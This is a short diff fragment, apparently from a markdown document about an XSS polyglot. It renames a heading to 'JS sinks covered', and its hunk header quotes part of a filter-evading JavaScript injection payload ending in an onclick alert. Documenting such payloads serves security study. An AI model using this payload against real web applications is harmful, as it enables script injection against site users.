@@ -176,7 +176,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 ```
 _Demo: <https://jsbin.com/vovogo>_
 
-#### JS sinks:
+#### JS sinks covered:
 * __`eval`:__
 ````javascript
 
